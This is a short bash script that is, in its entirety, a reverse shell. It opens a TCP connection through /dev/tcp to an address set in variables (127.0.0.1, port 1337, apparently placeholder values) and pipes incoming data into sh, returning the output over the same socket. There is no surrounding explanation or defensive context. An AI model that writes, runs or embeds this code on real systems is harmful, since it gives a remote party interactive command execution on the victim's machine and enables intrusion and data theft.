REMOTE_IP="127.0.0.1"
REMOTE_PORT=1337

exec 3<> /dev/tcp/$REMOTE_IP/$REMOTE_PORT
cat <&3 | sh >&3 &

